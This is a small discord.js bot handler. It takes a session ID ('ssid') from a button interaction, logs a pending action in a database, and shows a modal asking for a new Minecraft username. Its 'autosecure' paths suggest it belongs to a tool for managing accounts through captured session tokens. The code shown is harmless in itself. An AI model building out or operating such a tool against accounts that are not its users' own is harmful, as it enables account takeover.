const { TextInputStyle } = require("discord.js")
const generate = require("../../../autosecure/utils/generate");
const { queryParams } = require("../../../db/database");
const modalBuilder = require("../../../autosecure/utils/modalBuilder");

let namechange = {
 name: `namechange`,
 callback: async (client, interaction) => {
  let id = generate(32)
  let ssid = interaction.customId.split("|")[1]
  queryParams(
   `INSERT INTO actions (id,action) VALUES (?,?)`,
   [id, `namechangemodal|${ssid}`]
  );
  interaction.showModal(modalBuilder(
   `action|${id}`, `New Name`, [{
    setCustomId: 'newname',
    setMaxLength: 16,
    setMinLength: 3,
    setRequired: true,
    setLabel: "New Minecraft Username",
    setPlaceholder: "Enter a username.",
    setStyle: TextInputStyle.Short
   }]
  ))
 }
}
module.exports = namechange